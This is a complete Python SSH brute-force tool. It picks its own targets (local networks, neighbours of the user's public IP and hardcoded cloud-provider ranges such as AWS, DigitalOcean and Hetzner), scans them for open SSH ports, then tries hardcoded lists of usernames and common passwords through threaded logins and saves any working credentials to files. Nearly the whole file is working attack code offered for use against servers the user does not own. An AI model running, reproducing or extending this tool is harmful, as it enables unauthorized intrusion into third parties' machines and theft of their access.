#!/usr/bin/env python3
"""
VPS SSH BRUTE FORCER - Auto IP Discovery + Hardcoded Passwords
No input needed - automatically finds IPs and uses built-in password list
Author: Security Research
"""

import socket
import threading
import paramiko
import sys
import time
import queue
import random
import os
import ipaddress
import subprocess
from datetime import datetime

class VPSSSHScanner:
    def __init__(self, threads=100, timeout=3):
        self.threads = threads
        self.timeout = timeout
        self.scan_queue = queue.Queue()
        self.brute_queue = queue.Queue()
        self.open_ssh = []
        self.found_creds = []
        self.lock = threading.Lock()
        self.scanning = True
        self.brute_running = True
        self.total_scanned = 0
        self.total_found = 0
        self.start_time = None
        self.total_targets = 0
        self.discovered_ips = []
        
        # Common SSH ports to scan
        self.ssh_ports = [
            22, 2222, 22222, 222222,  # Standard SSH
            2022, 2200, 222,           # Alternative SSH
            443, 4443,                   # HTTPS masquerading
            9922, 992,                    # Other common
            10022, 20022,                  # High ports
        ]
        self.ssh_ports = list(set(self.ssh_ports))
        self.ssh_ports.sort()
        
        # ===== HARDCODED USERNAME LIST =====
        self.usernames = [
            'root', 'admin', 'user', 'ubuntu', 'centos', 
            'debian', 'fedora', 'oracle', 'ec2-user', 'azureuser',
            'pi', 'vagrant', 'test', 'guest', 'ftp',
            'www-data', 'nginx', 'apache', 'mysql', 'postgres',
            'tomcat', 'git', 'docker', 'kali', 'backup',
            'support', 'administrator', 'Administrator', 'guest',
            'minecraft', 'teamspeak', 'ts3', 'csgo', 'gmod',
            'discord', 'bot', 'server', 'vps', 'host',
            'web', 'webmaster', 'sysadmin', 'adminuser', 'useradmin',
            'rooter', 'toor', 'root123', 'admin123', 'password',
        ]
        
        # ===== HARDCODED PASSWORD LIST (MOST COMMON) =====
        self.passwords = [
            # Top 20 most common passwords
            '123456', 'password', '12345678', 'qwerty', '123456789',
            '12345', '1234', '111111', '1234567', 'dragon',
            '123123', 'baseball', 'abc123', 'football', 'monkey',
            'letmein', 'shadow', 'master', '666666', 'qwertyuiop',
            '123321', 'mustang', '1234567890', 'michael', '654321',
            'superman', '1qaz2wsx', '7777777', '121212', '000000',
            'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan',
            'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster',
            'soccer', 'harley', 'batman', 'andrew', 'tigger',
            'sunshine', 'iloveyou', '2000', 'charlie', 'robert',
            'thomas', 'hockey', 'ranger', 'daniel', 'starwars',
            'klaster', '112233', 'george', 'computer', 'michelle',
            'jessica', 'pepper', '1111', 'zxcvbn', '555555',
            '11111111', '131313', 'freedom', '777777', 'pass',
            'maggie', '159753', 'aaaaaa', 'ginger', 'princess',
            'joshua', 'cheese', 'amanda', 'summer', 'love',
            'ashley', '6969', 'nicole', 'chelsea', 'biteme',
            'matthew', 'access', 'yankees', '987654321', 'dallas',
            'austin', 'thunder', 'taylor', 'matrix', 'mobilemail',
            'mom', 'monitor', 'monitoring', 'montana', 'moon',
            'moscow', 'bobby', 'boston', 'brandon', 'brazil',
            'brooklyn', 'bryan', 'bubble', 'buddha', 'buddy',
            'bull', 'bullet', 'bumper', 'bunker', 'buster',
            'butter', 'button', 'cactus', 'cadillac', 'caitlin',
            'california', 'cameron', 'camping', 'cancer', 'candle',
            'candy', 'cannon', 'canoe', 'canon', 'canton',
            'carlos', 'carmen', 'carnage', 'carolina', 'carpet',
            'carrie', 'carrot', 'carson', 'carter', 'cartman',
            'cartoon', 'cascade', 'casino', 'castle', 'casual',
            'catfish', 'catholic', 'cattle', 'caught', 'causal',
            'cause', 'caution', 'cave', 'cecil', 'cedar',
            
            # VPS/Server related passwords
            'root', 'toor', 'root123', 'rootpass', 'rootpassword',
            'admin', 'admin123', 'adminpass', 'adminpassword',
            'server', 'server123', 'vps', 'vps123', 'vpspass',
            'host', 'host123', 'cloud', 'cloud123', 'aws',
            'azure', 'google', 'digitalocean', 'linode', 'vultr',
            'hetzner', 'ovh', 'rackspace', 'softlayer', 'ibm',
            'cpanel', 'whm', 'plesk', 'webmin', 'vesta',
            'centos', 'ubuntu', 'debian', 'fedora', 'redhat',
            'mysql', 'postgres', 'mongodb', 'redis', 'elastic',
            'docker', 'kubernetes', 'k8s', 'podman', 'swarm',
            'nginx', 'apache', 'httpd', 'tomcat', 'jetty',
            'jenkins', 'gitlab', 'github', 'bitbucket', 'git',
            'wordpress', 'joomla', 'drupal', 'magento', 'shopify',
            'phpmyadmin', 'phpadmin', 'mysqladmin', 'database',
            'backup', 'backups', 'backup123', 'backupuser',
            'ftp', 'ftproot', 'ftpuser', 'ftppass', 'sftp',
            'ssh', 'sshd', 'sshusers', 'sshpass', 'sshroot',
            
            # Empty/null passwords
            '', ' ', '  ', 'null', 'none', 'undefined',
            
            # Numbers and simple combinations
            '0', '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789',
            '01', '012', '0123', '01234', '012345', '0123456', '01234567', '012345678',
            '111', '1111', '11111', '111111', '1111111', '11111111', '111111111',
            '222', '2222', '22222', '222222', '2222222', '22222222',
            '333', '3333', '33333', '333333', '3333333',
            '444', '4444', '44444', '444444',
            '555', '5555', '55555', '555555',
            '666', '6666', '66666', '666666',
            '777', '7777', '77777', '777777',
            '888', '8888', '88888', '888888',
            '999', '9999', '99999', '999999',
            
            # Common with @ and special chars
            'root@123', 'admin@123', 'user@123', 'pass@123',
            'root#123', 'admin#123', 'user#123', 'pass#123',
            'root$123', 'admin$123', 'user$123', 'pass$123',
            'P@ssw0rd', 'P@55w0rd', 'Passw0rd', 'passw0rd',
            'Root@123', 'Admin@123', 'User@123', 'Password123',
            
            # Years
            '2020', '2021', '2022', '2023', '2024', '2025', '2026',
            '2000', '2001', '2002', '2003', '2004', '2005', '2006',
            '1990', '1991', '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999',
            
            # Common names
            'alex', 'alexander', 'alexis', 'alfred', 'alice', 'alicia',
            'allen', 'alvin', 'amanda', 'amber', 'amy', 'andrea',
            'andrew', 'angela', 'angel', 'anna', 'anthony', 'antonio',
            'april', 'archie', 'arlene', 'arthur', 'ashley', 'austin',
            'barbara', 'barry', 'benjamin', 'benny', 'bernard', 'bernice',
            'bert', 'bertha', 'beth', 'betty', 'beulah', 'beverly',
            'bill', 'billy', 'blanche', 'bob', 'bobby', 'bonnie',
            'brad', 'bradley', 'brenda', 'brett', 'brian', 'bridget',
            'bruce', 'bryan', 'byron', 'caleb', 'calvin', 'cameron',
            
            # Keyboard patterns
            'qwerty', 'qwertyuiop', 'asdfgh', 'asdfghjkl', 'zxcvbn', 'zxcvbnm',
            '1qaz2wsx', '1qaz2wsx3edc', 'q1w2e3r4', '1q2w3e4r', 'qwerty123',
            'qwertyuiop123', 'asdfgh123', 'zxcvbn123', 'passw0rd', 'password123',
            'admin123', 'root123', 'ubuntu123', 'centos123', 'debian123',
        ]
        
        self.print_banner()
    
    def print_banner(self):
        print("""\033[91m
╔═══════════════════════════════════════════════════════════════════════╗
║         VPS SSH BRUTE FORCER - HARDCODED PASSWORDS EDITION          ║
║                                                                       ║
║   Step 1: Auto discover VPS IPs                                      ║
║   Step 2: Scan for open SSH ports                                    ║
║   Step 3: Brute force with {len(self.passwords)} hardcoded passwords          ║
╚═══════════════════════════════════════════════════════════════════════╝\033[0m""")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.1"
    
    def get_public_ip(self):
        """Get public IP address"""
        try:
            response = subprocess.run(['curl', '-s', 'ifconfig.me'], 
                                    capture_output=True, text=True, timeout=5)
            if response.returncode == 0:
                return response.stdout.strip()
        except:
            pass
        
        try:
            response = subprocess.run(['curl', '-s', 'api.ipify.org'], 
                                    capture_output=True, text=True, timeout=5)
            if response.returncode == 0:
                return response.stdout.strip()
        except:
            pass
        
        return None
    
    def generate_ip_range(self, network_base, start, end):
        """Generate IP range"""
        ips = []
        for i in range(start, end + 1):
            ips.append(f"{network_base}.{i}")
        return ips
    
    def discover_ips(self):
        """Automatically discover VPS IPs to scan"""
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔍 AUTO IP DISCOVERY\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        
        # Local network
        local_ip = self.get_local_ip()
        local_parts = local_ip.split('.')
        if len(local_parts) == 4:
            local_base = f"{local_parts[0]}.{local_parts[1]}.{local_parts[2]}"
            print(f"\033[93m[*] Adding local network: {local_base}.0/24\033[0m")
            self.discovered_ips.extend(self.generate_ip_range(local_base, 1, 254))
        
        # Common private networks
        print(f"\033[93m[*] Adding private network ranges\033[0m")
        self.discovered_ips.extend(self.generate_ip_range("10.0.0", 1, 254))
        self.discovered_ips.extend(self.generate_ip_range("10.0.1", 1, 254))
        self.discovered_ips.extend(self.generate_ip_range("172.16.0", 1, 254))
        self.discovered_ips.extend(self.generate_ip_range("172.16.1", 1, 254))
        self.discovered_ips.extend(self.generate_ip_range("192.168.0", 1, 254))
        self.discovered_ips.extend(self.generate_ip_range("192.168.1", 1, 254))
        
        # Public IP and neighbors
        public_ip = self.get_public_ip()
        if public_ip:
            print(f"\033[92m[+] Your public IP: {public_ip}\033[0m")
            self.discovered_ips.append(public_ip)
            
            ip_parts = public_ip.split('.')
            if len(ip_parts) == 4:
                base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
                current = int(ip_parts[3])
                start = max(1, current - 10)
                end = min(254, current + 10)
                print(f"\033[93m[*] Adding neighbors of your public IP\033[0m")
                self.discovered_ips.extend(self.generate_ip_range(base, start, end))
        
        # Common VPS provider ranges (popular ones)
        print(f"\033[93m[*] Adding common VPS provider ranges\033[0m")
        
        # DigitalOcean (NYC region)
        for i in range(1, 50):
            self.discovered_ips.append(f"159.89.{i}.1")
            self.discovered_ips.append(f"165.227.{i}.1")
        
        # Linode
        for i in range(1, 50):
            self.discovered_ips.append(f"172.104.{i}.1")
            self.discovered_ips.append(f"139.162.{i}.1")
        
        # Vultr
        for i in range(1, 50):
            self.discovered_ips.append(f"108.61.{i}.1")
            self.discovered_ips.append(f"45.32.{i}.1")
        
        # AWS EC2
        for i in range(1, 50):
            self.discovered_ips.append(f"54.144.{i}.1")
            self.discovered_ips.append(f"54.208.{i}.1")
        
        # Google Cloud
        for i in range(1, 50):
            self.discovered_ips.append(f"35.184.{i}.1")
            self.discovered_ips.append(f"35.188.{i}.1")
        
        # Hetzner
        for i in range(1, 50):
            self.discovered_ips.append(f"49.12.{i}.1")
            self.discovered_ips.append(f"49.13.{i}.1")
        
        # OVH
        for i in range(1, 50):
            self.discovered_ips.append(f"51.68.{i}.1")
            self.discovered_ips.append(f"51.77.{i}.1")
        
        # Remove duplicates
        self.discovered_ips = list(set(self.discovered_ips))
        
        print(f"\033[92m[+] Discovered {len(self.discovered_ips)} IPs to scan\033[0m")
        return self.discovered_ips
    
    def scan_port(self, ip, port):
        """Scan a single port on an IP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Port open - try to get banner
                try:
                    sock.settimeout(2)
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    sock.close()
                    
                    # Check if it's SSH
                    if ('SSH' in banner or 'ssh' in banner.lower() or 
                        'OpenSSH' in banner or 'dropbear' in banner.lower()):
                        
                        with self.lock:
                            self.open_ssh.append({
                                'ip': ip,
                                'port': port,
                                'banner': banner[:100]
                            })
                        
                        print(f"\033[92m[✓] SSH FOUND: {ip}:{port} - {banner[:50]}\033[0m")
                        return True
                    else:
                        # Port open but not SSH
                        pass
                        
                except:
                    # No banner but port open - possible SSH
                    with self.lock:
                        self.open_ssh.append({
                            'ip': ip,
                            'port': port,
                            'banner': 'Unknown (no banner)'
                        })
                    print(f"\033[93m[?] POSSIBLE SSH: {ip}:{port} (no banner)\033[0m")
                    return True
            
            sock.close()
            
        except:
            pass
        
        return False
    
    def scanner_worker(self):
        """Worker thread for scanning IPs"""
        while self.scanning:
            try:
                ip = self.scan_queue.get(timeout=1)
                
                with self.lock:
                    self.total_scanned += 1
                
                # Show progress
                if self.total_scanned % 10 == 0:
                    elapsed = time.time() - self.start_time if self.start_time else 0
                    rate = self.total_scanned / elapsed if elapsed > 0 else 0
                    remaining = self.total_targets - self.total_scanned
                    eta = remaining / rate if rate > 0 else 0
                    
                    print(f"\r\033[94m[*] Scanning: {self.total_scanned}/{self.total_targets} IPs | Found SSH: {len(self.open_ssh)} | Rate: {rate:.1f}/s | ETA: {eta:.0f}s\033[0m", end='')
                
                # Scan all ports for this IP
                for port in self.ssh_ports:
                    if not self.scanning:
                        break
                    self.scan_port(ip, port)
                
                self.scan_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                continue
    
    def ssh_connect(self, ip, port, username, password):
        """Attempt SSH connection"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                ip,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout,
                auth_timeout=self.timeout
            )
            
            client.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except:
            return False
    
    def brute_worker(self):
        """Worker thread for brute forcing"""
        while self.brute_running:
            try:
                target = self.brute_queue.get(timeout=1)
                ip = target['ip']
                port = target['port']
                banner = target.get('banner', 'Unknown')
                
                print(f"\n\033[94m[*] Attacking: {ip}:{port} [{banner[:30]}]\033[0m")
                
                attempts = 0
                found = False
                total_attempts = len(self.usernames) * len(self.passwords)
                
                for username in self.usernames:
                    if not self.brute_running or found:
                        break
                    
                    for password in self.passwords:
                        if not self.brute_running or found:
                            break
                        
                        attempts += 1
                        
                        # Show progress
                        if attempts % 50 == 0:
                            percent = (attempts / total_attempts) * 100
                            print(f"\033[90m    Progress: {attempts}/{total_attempts} ({percent:.1f}%) - Trying: {username}:{password}\033[0m", end='\r')
                        
                        if self.ssh_connect(ip, port, username, password):
                            result = f"\n\033[92m[🔥] SUCCESS! {ip}:{port} - {username}:{password}\033[0m"
                            print(result)
                            
                            with self.lock:
                                self.found_creds.append({
                                    'ip': ip,
                                    'port': port,
                                    'username': username,
                                    'password': password,
                                    'banner': banner
                                })
                            
                            # Save immediately
                            self.save_result(ip, port, username, password)
                            
                            found = True
                            break
                        
                        time.sleep(0.02)
                
                self.brute_queue.task_done()
                
                if not found:
                    print(f"\n\033[91m[-] Failed: {ip}:{port} - No valid credentials\033[0m")
                
            except queue.Empty:
                break
            except:
                continue
    
    def save_result(self, ip, port, username, password):
        """Save found credentials"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('ssh_found.txt', 'a') as f:
            f.write(f"[{timestamp}] {ip}:{port} - {username}:{password}\n")
    
    def save_open_ssh(self):
        """Save open SSH hosts"""
        with open('ssh_open.txt', 'w') as f:
            f.write(f"# Open SSH hosts found - {datetime.now()}\n")
            f.write(f"# Total: {len(self.open_ssh)}\n\n")
            for ssh in self.open_ssh:
                f.write(f"{ssh['ip']}:{ssh['port']} | {ssh['banner']}\n")
    
    def print_summary(self):
        """Print scan summary"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 SCAN SUMMARY\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"IPs discovered: {len(self.discovered_ips)}")
        print(f"IPs scanned: {self.total_scanned}")
        print(f"SSH hosts found: {len(self.open_ssh)}")
        print(f"Credentials found: {len(self.found_creds)}")
        print(f"Usernames in list: {len(self.usernames)}")
        print(f"Passwords in list: {len(self.passwords)}")
        print(f"Time elapsed: {elapsed:.1f} seconds")
        print(f"Scan rate: {self.total_scanned/elapsed:.1f} IPs/sec" if elapsed > 0 else "Scan rate: N/A")
        print(f"\033[96m{'='*60}\033[0m")
    
    def run(self):
        """Main execution"""
        self.start_time = time.time()
        
        # ===== PHASE 0: AUTO DISCOVER IPs =====
        self.discover_ips()
        
        if not self.discovered_ips:
            print("\033[91m[-] No IPs discovered. Exiting.\033[0m")
            return
        
        self.total_targets = len(self.discovered_ips)
        
        # ===== PHASE 1: SCAN FOR SSH PORTS =====
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔍 PHASE 1: SCANNING {self.total_targets} IPS FOR SSH\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Threads: {self.threads}")
        print(f"Timeout: {self.timeout}s")
        print(f"SSH ports: {len(self.ssh_ports)}")
        print(f"Total scans: {self.total_targets * len(self.ssh_ports):,}")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Fill scan queue
        for ip in self.discovered_ips:
            self.scan_queue.put(ip)
        
        # Start scanner threads
        scanner_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.scanner_worker)
            t.daemon = True
            t.start()
            scanner_threads.append(t)
        
        # Wait for scanning to complete
        try:
            self.scan_queue.join()
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Scan interrupted\033[0m")
            self.scanning = False
        
        self.scanning = False
        
        # Save open SSH hosts
        self.save_open_ssh()
        
        # Print summary
        self.print_summary()
        
        if not self.open_ssh:
            print(f"\033[91m[-] No open SSH hosts found. Exiting.\033[0m")
            return
        
        # ===== PHASE 2: BRUTE FORCE WITH HARDCODED PASSWORDS =====
        print(f"\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m🔥 PHASE 2: BRUTE FORCING {len(self.open_ssh)} SSH HOSTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        print(f"Usernames: {len(self.usernames)}")
        print(f"Passwords: {len(self.passwords)} (HARDCODED)")
        total_attempts = len(self.open_ssh) * len(self.usernames) * len(self.passwords)
        print(f"Total attempts: {total_attempts:,}")
        print(f"\033[96m{'='*60}\033[0m\n")
        
        # Ask to proceed
        proceed = input(f"\033[93m[?] Proceed with brute force? (y/n): \033[0m").lower()
        if proceed != 'y':
            print(f"\033[91m[-] Exiting\033[0m")
            return
        
        # Fill brute queue
        for ssh in self.open_ssh:
            self.brute_queue.put(ssh)
        
        # Start brute threads
        brute_threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.brute_worker)
            t.daemon = True
            t.start()
            brute_threads.append(t)
        
        # Monitor brute progress
        try:
            while not self.brute_queue.empty():
                time.sleep(5)
                remaining = self.brute_queue.qsize()
                completed = len(self.open_ssh) - remaining
                percent = (completed / len(self.open_ssh)) * 100 if len(self.open_ssh) > 0 else 0
                
                attempts_made = completed * len(self.usernames) * len(self.passwords)
                total_percent = (attempts_made / total_attempts) * 100 if total_attempts > 0 else 0
                
                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {len(self.found_creds)} | Total: {total_percent:.1f}%\033[0m", end='')
        except KeyboardInterrupt:
            print(f"\n\033[93m[!] Brute force interrupted\033[0m")
            self.brute_running = False
        
        self.brute_running = False
        
        # ===== FINAL RESULTS =====
        print(f"\n\n\033[96m{'='*60}\033[0m")
        print(f"\033[96m📊 FINAL RESULTS\033[0m")
        print(f"\033[96m{'='*60}\033[0m")
        
        if self.found_creds:
            print(f"\n\033[92m[🔥] CREDENTIALS FOUND: {len(self.found_creds)}\033[0m")
            print(f"\033[96m{'-'*60}\033[0m")
            for i, cred in enumerate(self.found_creds, 1):
                print(f"{i:2}. {cred['ip']:15}:{cred['port']:<5} | {cred['username']}:{cred['password']}")
            
            # Save final credentials
            with open('ssh_creds_final.txt', 'w') as f:
                f.write(f"# SSH Credentials Found - {datetime.now()}\n")
                f.write(f"# Total: {len(self.found_creds)}\n\n")
                for cred in self.found_creds:
                    f.write(f"{cred['ip']}:{cred['port']} | {cred['username']}:{cred['password']}\n")
        else:
            print(f"\n\033[91m[-] No credentials found\033[0m")
        
        print(f"\n\033[92m[+] Results saved to:\033[0m")
        print(f"    - ssh_open.txt (all discovered SSH hosts)")
        print(f"    - ssh_found.txt (credentials found during attack)")
        print(f"    - ssh_creds_final.txt (final credentials list)")

def main():
    """Main function"""
    
    # Check for paramiko
    try:
        import paramiko
    except ImportError:
        print("\033[91m[-] Paramiko not installed. Install with: pip install paramiko\033[0m")
        sys.exit(1)
    
    # Parse arguments
    import argparse
    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - Hardcoded Passwords')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--timeout', type=int, default=3, help='Connection timeout (default: 3)')
    
    args = parser.parse_args()
    
    # Create and run brute forcer
    brute = VPSSSHScanner(threads=args.threads, timeout=args.timeout)
    
    try:
        brute.run()
    except KeyboardInterrupt:
        print(f"\n\033[93m[!] Program interrupted by user\033[0m")
        brute.print_summary()
        sys.exit(0)

if __name__ == "__main__":
    main()
